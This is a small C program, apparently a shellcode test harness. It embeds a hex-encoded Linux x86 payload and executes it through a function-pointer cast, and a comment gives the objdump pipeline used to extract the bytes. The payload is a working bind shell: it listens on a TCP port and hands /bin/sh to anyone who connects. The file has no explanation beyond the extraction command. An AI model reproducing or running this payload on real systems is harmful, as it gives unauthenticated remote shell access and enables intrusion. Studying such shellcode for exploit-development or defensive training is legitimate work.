#include<stdio.h>
#include<string.h>

/* objdump -d ./bind.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' */

unsigned char code[] = \
"\x31\xc0\x31\xdb\x99\x52\x42\x52\x42\x52\xb0\x66\x43\x89\xe1\xcd\x80\x99\x43\x52\x66\x68\x1a\x0a\x66\x53\x89\xe1\x92\x6a\x10\x51\x52\xb0\x66\x89\xe1\xcd\x80\x50\x52\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x50\x50\x52\xb0\x66\x43\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x41\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x99\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();

	return 0;

}

	
